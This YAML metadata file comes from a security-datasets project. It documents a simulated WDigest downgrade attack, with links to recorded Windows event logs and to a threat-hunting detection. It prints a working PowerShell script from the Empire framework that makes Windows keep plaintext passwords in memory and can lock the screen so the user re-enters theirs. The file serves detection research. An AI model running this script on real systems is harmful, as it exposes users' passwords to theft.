id: 190518-RegKeyModification-WDigestDowngrade
title: WDigest Downgrade via Registry Modification
description: This dataset represents adversaries setting the UseLogonCredential property value from HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest key to 1 to enable plain text passwords.
references:

contributors:
  - Roberto Rodriguez @Cyb3rWard0g
creation_date: 2019/05/18
modification_date: 2022/09/22
platform:
  - Windows
type: atomic
tags:
  - Registry Modification
  - Windows Registry WDigest

attack_mappings:
  - technique: T1112
    sub-technique:
    tactics:
      - TA0005

datasets:
  endpoint:
    - log_source: Microsoft-Windows-Sysmon
      size: 27.41 kB
      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RegKeyModification-WDigestDowngrade/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
    - log_source: Microsoft-Windows-Security-Auditing
      size: 287.15 kB
      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/SecurityDatasets2.0/datasets/atomic/windows/190518-RegKeyModification-WDigestDowngrade/WORKSTATION6_Windows_Security.zip

simulation:
  executor: PowerShell
  scriptUri: https://github.com/BC-SECURITY/Empire/blob/master/empire/server/modules/powershell/management/wdigest_downgrade.yaml
  supportingFileUris:
  commands: |-
    function Invoke-LockWorkStation {
        # region define P/Invoke types dynamically
        #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
        #   thanks matt and chris :)
        $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
    
        $TypeBuilder = $ModuleBuilder.DefineType('Win32.User32', 'Public, Class')
        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
        $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
            @('User32.dll'),
            [Reflection.FieldInfo[]]@($SetLastError),
            @($True))
    
        # Define [Win32.User32]::LockWorkStation()
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('LockWorkStation',
            'User32.dll',
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            [Type[]]@(),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Ansi)
        $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
        
        $User32 = $TypeBuilder.CreateType()
        
        $Null = $User32::LockWorkStation()
    }
    function Invoke-WdigestDowngrade {
        <#
        .SYNOPSIS
        Explicitly sets Wdigest on a Windows 8.1/Server 2012 machine to use logon credentials.
        Locks the screen after so the user must retype their password.
        
        .PARAMETER NoLock
        Doesn't lock the screen after registry set.
        .PARAMETER Cleanup
        Removes the registry key to force UseLogonCredential.
        .LINK
        https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
        #>
        [CmdletBinding()]
        Param (
            [Switch] $NoLock,
            [Switch] $Cleanup
        )
        if($Cleanup){
            try {
                Remove-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction Stop
                "Wdigest set to not use logoncredential."
            }
            catch {
                "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential not set"
            }
        }
        else{
            Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
            "Wdigest set to use logoncredential."
            if(-not $NoLock){
                Invoke-LockWorkStation
                "Workstation locked"
            }
        }
    }
    Invoke-WdigestDowngrade -NoLock
  output: |-
    Wdigest set to use logoncredential.

detection:
  - project: Threat Hunter Playbook
    name: WDigest Downgrade
    link: https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190510202010.html